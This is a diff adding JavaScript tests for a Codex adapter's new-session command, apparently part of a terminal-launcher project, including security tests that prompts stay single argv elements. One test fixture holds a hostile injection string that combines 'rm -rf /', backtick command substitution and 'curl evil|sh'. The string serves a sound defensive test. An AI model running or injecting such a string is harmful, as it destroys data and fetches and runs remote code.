@@ -26,7 +26,12 @@ import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 
 import { buildLaunch, launcherScript, terminalsFor } from '../../src/core/terminals.mjs';
-import { adapter, codexExecArgs, codexResumeCommand } from '../../src/adapters/codex/adapter.mjs';
+import {
+  adapter,
+  codexExecArgs,
+  codexNewSessionCommand,
+  codexResumeCommand,
+} from '../../src/adapters/codex/adapter.mjs';
 
 // ---------------------------------------------------------------------------
 // Fixtures
@@ -148,6 +153,21 @@ test('codexResumeCommand is exactly `codex resume <id>`, with the id in its own 
   assert.equal(codexResumeCommand(HOSTILE).filter((a) => a.includes(HOSTILE)).length, 1);
 });
 
+test('codexNewSessionCommand is plain `codex`, or `codex <prompt>` — never `codex resume new`', () => {
+  // §95 left openNewSession running `codex resume new` and dropping the first
+  // prompt; §99 is the fix. The prompt is one element; blank means none.
+  assert.deepEqual(codexNewSessionCommand(), ['codex']);
+  assert.deepEqual(codexNewSessionCommand(''), ['codex']);
+  assert.deepEqual(codexNewSessionCommand('   \n'), ['codex']);
+  assert.deepEqual(codexNewSessionCommand(undefined), ['codex']);
+  assert.deepEqual(codexNewSessionCommand(null), ['codex']);
+  assert.deepEqual(codexNewSessionCommand('fix the tests'), ['codex', 'fix the tests']);
+  assert.deepEqual(codexNewSessionCommand('  fix the tests\n'), ['codex', 'fix the tests']);
+  assert.ok(!codexNewSessionCommand('anything').includes('resume'));
+  assert.ok(!codexNewSessionCommand().includes('resume'));
+  assert.ok(!codexNewSessionCommand().includes('new'));
+});
+
 test('codexExecArgs puts the id and the turn text in one element each, resumed or not', () => {
   assert.deepEqual(codexExecArgs({ sessionId: ID, text: 'hello', canResume: true }), [
     'exec',
@@ -235,6 +255,42 @@ test('SECURITY: a Codex session id full of shell metacharacters never becomes sh
     assert.equal(carriers.length, 1, `${key}: expected exactly one carrier`);
     assert.equal(carriers[0], HOSTILE, `${key}: the id was concatenated with something`);
   }
+});
+
+test('SECURITY: a hostile first prompt for a new session is one argv element, on any platform', () => {
+  const prompt = 'refactor; rm -rf / # and `whoami` && curl evil|sh';
+  const command = codexNewSessionCommand(prompt);
+  assert.deepEqual(command, ['codex', prompt]);
+  for (const { platform, terminal, via, key } of pairs()) {
+    const { cmd, args } = buildLaunch(terminal, {
+      command,
+      cwd: CWD[platform],
+      scriptPath: SCRIPT,
+      via,
+    });
+    assert.ok(!cmd.includes(prompt), `${key}: the prompt reached the executable name`);
+
+    if (terminal.needsScript) {
+      for (const a of args)
+        assert.ok(!a.includes(prompt), `${key}: the prompt reached an argv element`);
+      continue;
+    }
+
+    if (platform === 'win32') {
+      assert.equal(unquoteCmdLine(args[3]).at(-1), prompt, `${key}: the prompt was not one word`);
+      assert.deepEqual(bareMetachars(args[3]), [], `${key}: metacharacters escaped their quotes`);
+      continue;
+    }
+
+    const carriers = args.filter((a) => a.includes(prompt));
+    assert.equal(carriers.length, 1, `${key}: expected exactly one carrier`);
+    assert.equal(carriers[0], prompt, `${key}: the prompt was concatenated with something`);
+  }
+
+  // And inside the wrapper script it is one single-quoted word after `codex`.
+  const script = launcherScript(command, CWD.darwin);
+  const execLine = script.split('\n').find((l) => l.startsWith('exec '));
+  assert.deepEqual(unquoteShLine(execLine.slice('exec '.length)), command);
 });
 
 test('SECURITY: a hostile working directory is one argv element too, or is not in the argv at all', () => {
@@ -341,6 +397,10 @@ test('SECURITY: every process the Codex adapter starts is started with an argv a
   );
   assert.match(code, /spawn\('codex',\s*args,/, 'spawn must take a named argv array');
   assert.match(code, /await launchTerminal\(\{/, 'terminals must be opened by launchTerminal');
+  // §99: a new session names its own command; it no longer borrows the resume
+  // path, so `codex resume new` cannot come back by delegation.
+  assert.ok(!/openInTerminal\('codex:new'/.test(code), 'openNewSession must not resume "new"');
+  assert.match(code, /command: codexNewSessionCommand\(opts\.instructions\)/);
 });
 
 // ---------------------------------------------------------------------------
